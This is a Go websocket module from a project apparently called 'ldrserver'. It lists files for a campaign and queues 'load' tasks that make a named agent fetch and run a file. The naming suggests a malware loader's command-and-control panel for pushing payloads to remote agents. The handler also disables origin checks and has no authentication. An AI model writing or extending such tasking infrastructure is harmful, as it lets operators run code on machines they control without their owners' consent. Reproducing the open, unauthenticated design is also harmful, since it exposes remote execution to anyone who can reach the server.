package ws

import (
	"encoding/json"
	"net/http"
	"sync"

	"github.com/gorilla/websocket"
	"ldrserver/internal/database"
)

const (
	CodeListFiles = 1
	CodeRunFile   = 2

	taskLoad = 0x1
)

type runFilePayload struct {
	FileUUID string `json:"file_uuid"`
}

type WsReq struct {
	Type       string          `json:"type"`
	ID         string          `json:"id"`
	Code       int             `json:"code"`
	AgentID    string          `json:"agent_id"`
	CampaignID string          `json:"campaign_id"`
	Payload    json.RawMessage `json:"payload"`
}

type frame struct {
	Type  string      `json:"type"`
	ID    string      `json:"id,omitempty"`
	Code  int         `json:"code,omitempty"`
	Event string      `json:"event,omitempty"`
	OK    bool        `json:"ok,omitempty"`
	Data  interface{} `json:"data,omitempty"`
	Msg   string      `json:"msg,omitempty"`
}

type Client struct {
	conn *websocket.Conn
	send chan []byte
}

type WS struct {
	mu      sync.RWMutex
	Clients map[*Client]struct{}
	DB      *database.DB
}

func New(d *database.DB) *WS {
	return &WS{
		Clients: make(map[*Client]struct{}),
		DB:      d,
	}
}

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

func (ws *WS) add(c *Client) {
	ws.mu.Lock()
	defer ws.mu.Unlock()
	ws.Clients[c] = struct{}{}
}

func (ws *WS) remove(c *Client) {
	ws.mu.Lock()
	defer ws.mu.Unlock()
	delete(ws.Clients, c)
}

func (ws *WS) Broadcast(event string, data interface{}) {
	b, err := json.Marshal(frame{Type: "event", Event: event, Data: data})
	if err != nil {
		return
	}

	ws.mu.RLock()
	defer ws.mu.RUnlock()
	for c := range ws.Clients {
		select {
		case c.send <- b:
		default:
		}
	}
}

func (ws *WS) reply(c *Client, f frame) {
	b, err := json.Marshal(f)
	if err != nil {
		return
	}
	select {
	case c.send <- b:
	default:
	}
}

func (ws *WS) handle(c *Client, msg []byte) {
	var req WsReq
	if err := json.Unmarshal(msg, &req); err != nil {
		ws.reply(c, frame{Type: "res", OK: false, Msg: "invalid request"})
		return
	}

	switch req.Code {
	case CodeListFiles:
		files, err := ws.DB.ListFileMetadata(req.CampaignID)
		if err != nil {
			ws.reply(c, frame{Type: "res", ID: req.ID, Code: req.Code, OK: false, Msg: "failed listing files"})
			return
		}
		ws.reply(c, frame{Type: "res", ID: req.ID, Code: req.Code, OK: true, Data: files})
	case CodeRunFile:
		var payload runFilePayload
		if err := json.Unmarshal(req.Payload, &payload); err != nil || payload.FileUUID == "" {
			ws.reply(c, frame{Type: "res", ID: req.ID, Code: req.Code, OK: false, Msg: "missing file_uuid"})
			return
		}
		if err := ws.DB.InsertTask(req.AgentID, taskLoad, payload.FileUUID); err != nil {
			ws.reply(c, frame{Type: "res", ID: req.ID, Code: req.Code, OK: false, Msg: "failed to queue task"})
			return
		}
		ws.reply(c, frame{Type: "res", ID: req.ID, Code: req.Code, OK: true})
	default:
		ws.reply(c, frame{Type: "res", ID: req.ID, Code: req.Code, OK: false, Msg: "unknown code"})
	}
}

func (c *Client) writeLoop() {
	defer c.conn.Close()
	for msg := range c.send {
		if err := c.conn.WriteMessage(websocket.TextMessage, msg); err != nil {
			return
		}
	}
}

func (ws *WS) Handler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}

	c := &Client{conn: conn, send: make(chan []byte, 64)}
	ws.add(c)
	go c.writeLoop()

	defer func() {
		ws.remove(c)
		close(c.send)
	}()

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}
		ws.handle(c, msg)
	}
}
